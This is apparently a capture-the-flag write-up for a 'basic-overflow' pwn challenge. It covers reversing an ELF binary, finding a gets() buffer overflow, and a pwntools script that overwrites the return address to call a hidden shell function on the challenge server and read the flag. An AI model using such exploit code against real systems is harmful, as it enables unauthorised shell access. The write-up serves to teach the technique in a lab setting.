# Main idea

It is pwn task where we need to send payload that performs buffer overflow attack. We have binary elf file that we can reverse.
# Solution

To reverse the program i used Ghidra.
From decompiled main function we can see:

![](../../attachments/Pasted%20image%2020240115141509.png)

It creates buffer 64 bytes long. And waits our input using `gets()` function. It is usual function for pwn tasks, it is vulnarable for buffer overflow. It means that the function doesnt check the length of the input and overwrites the memory if input more than 64 bytes.

Additionally we can see `shell` function, it is not called in program:

![](../../attachments/Pasted%20image%2020240115141904.png)

But, with buffer overflow we can call it.

Firstly, we need to know what is address of the `shell` function. We can do this with command:

```sh
readelf -s basic-overflow 
```

And we can see the offset(address) of the functions:

![](../../attachments/Pasted%20image%2020240115142101.png)

The `shell`'s adress is `0000000000401136` and now we can write payload that overwrites the memory and calls shell function.

Our first payload:

```sh
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0000000000401136
```

If you try this, buffer would indeed overwrited but the function will not called, because of scepific address handling in stack. We should rewrite address to little endian format:

`\x36\x11\x40\x00\x00\x00\x00\x00`

And if you try to inject payload with memory like above, it will fail because it will not represent like bytes. So use python's pwn library.

```python
import pwn

r = pwn.remote('34.123.15.202', 5000)
# r = pwn.process('./basic-overflow')

# b"A" * (64 + 8) + b"\x00" * 4 + b"\x36\x11\x40"
r.sendline(b"A" * (64 + 8)  + b"\x36\x11\x40\x00\x00\x00\x00\x00")
r.sendline(b"cat flag")
res = r.recvline()

print(res)
```

And boom, get the flag

![](../../attachments/Pasted%20image%2020240115142819.png)
